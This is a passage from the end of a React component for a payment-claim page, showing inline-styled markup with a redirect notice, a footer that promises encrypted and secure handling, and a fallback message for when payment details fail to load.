                  <p style={{ color: '#999', fontSize: '0.8rem', margin: '1rem 0 0 0', textAlign: 'center', lineHeight: '1.5' }}>
                    You'll be redirected to our account application. Your payment claim will be linked to your new account.
                  </p>
                </div>
              )}

              {/* Footer */}
              <div style={{ marginTop: '2rem', paddingTop: '1.5rem', borderTop: '1px solid #e5e7eb' }}>
                <p style={{ color: '#999', fontSize: '0.8rem', margin: '0', textAlign: 'center', lineHeight: '1.6' }}>
                  🔐 All data is encrypted, secured, and processed safely. Your transaction will be handled with the highest security standards.
                </p>
              </div>
            </div>
          )}

          {!payment && !loading && (
            <div style={{ padding: '3rem 2rem', textAlign: 'center', color: '#666' }}>
              <p>Unable to load payment details.</p>
            </div>
          )}
        </div>
      </div>
    </>
  );
}
